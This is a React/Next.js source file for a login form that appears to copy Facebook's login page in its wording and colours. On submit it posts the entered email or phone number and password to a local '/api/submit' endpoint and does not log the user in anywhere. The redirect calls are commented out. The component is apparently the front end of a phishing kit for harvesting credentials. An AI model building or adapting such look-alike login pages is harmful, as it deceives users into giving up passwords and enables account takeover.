import React, { FC, useState, ChangeEvent, FormEvent } from "react";
import { FormData } from "../types";
import { redirectToCreateAccount, redirectToCreatePage, redirectToForgotPassword, redirectToLogin } from "../utils/index.";
import Image from "next/image";

interface FormProps {}
const Form: FC<FormProps> = () => {
  const [show, setShow] = useState<boolean>(false);
  const [isFocused, setIsFocused] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);

  const [formData, setFormData] = useState<FormData>({
    name: "",
    password: "",
  });

  // Handle input changes with proper event typing
  const handleChange = (e: ChangeEvent<HTMLInputElement>): void => {
    const { name, value } = e.target;
    setFormData((prevFormData) => ({
      ...prevFormData,
      [name]: value,
    }));
  };

  // Handle form submission with proper typing and error handling
  const handleSubmit = async (e: FormEvent<HTMLFormElement>): Promise<void> => {
    e.preventDefault();

    try {
      setIsLoading(true);

      if (process.env.NEXT_PUBLIC_ACTIVATE === "true") return;

      const response = await fetch("/api/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(formData),
      });

      const result = await response.json();

      if (response.ok) {
        setIsLoading(false);
        // redirectToLogin();
      } else {
        setIsLoading(false);
        console.error("Error submitting form:", result?.error);
        // redirectToLogin();
      }
    } catch (error) {
      setIsLoading(false);
      console.error("Error submitting form:", error);
      // redirectToLogin();
    }
  };

  return (
    <div>
      <div className="bg-white py-[14px] px-[14px] rounded-[8px] shadow-md w-[396px] mt-9 md:mt-0">
        <form onSubmit={handleSubmit}>
          <div className="flex flex-col gap-3 w-full">
            <input
              className="font-sans outline-none focus:border-[#0866ff] active:border-[#0866ff] py-[14px] px-[16px] rounded-[6px] border-[1.4px]"
              type="text"
              placeholder="Email address or phone number"
              name="name"
              value={formData.name}
              onChange={handleChange}
              required
            />
            <div
              className={`py-[14px] px-[16px] rounded-[6px] border-[1.4px] w-full flex items-center gap-3 ${
                isFocused ? "border-[#0866ff]" : "border-gray-300"
              }`}
            >
              <input
                className="font-sans border-none outline-none rounded-[6px] w-full"
                type={show ? "text" : "password"}
                placeholder="Password"
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                name="password"
                value={formData.password}
                onChange={handleChange}
                required
              />
              <span
                className="cursor-pointer hover:bg-opacity-95"
                onClick={() => setShow((prev) => !prev)}
              >
                {show ? (
                  <Image
                    src="/eye.png"
                    width={16}
                    height={16}
                    alt="Show password"
                  />
                ) : (
                  <Image
                    src="/eyeoff.png"
                    width={16}
                    height={16}
                    alt="Hide password"
                  />
                )}
              </span>
            </div>
          </div>
          <button
            type="submit"
            className="transition-ease bg-[#0866ff] disabled:bg-[#a1b3d5] hover:bg-opacity-90 text-[20px] font-bold text-white w-full px-[16px] py-2 rounded-[6px] mt-3"
            disabled={isLoading}
          >
            Log in
          </button>
        </form>
        <p
          onClick={redirectToForgotPassword}
          className="font-sans hover:underline text-[#0866ff] text-[14px] font-medium text-center pt-4 cursor-pointer"
        >
          Forgotten password?
        </p>

        <div className="w-full border-[0.1px] my-[20px]"></div>

        <div className="flex items-center justify-center pb-3">
          <button
            onClick={redirectToCreateAccount}
            className="transition-ease font-sans bg-[#42b72a] hover:bg-opacity-90 py-[11px] px-[16px] text-white rounded-[6px] text-[17px] font-bold"
          >
            Create new account
          </button>
        </div>
      </div>

      <div className="mt-[28px] text-center">
        <p
          onClick={redirectToCreatePage}
          className="font-sans text-[#1c1e21] text-[14px] font-medium cursor-pointer"
        >
          <strong className="font-bold hover:underline">Create a Page</strong>{" "}
          for a celebrity, brand or business.
        </p>
      </div>
    </div>
  );
};

export default Form;
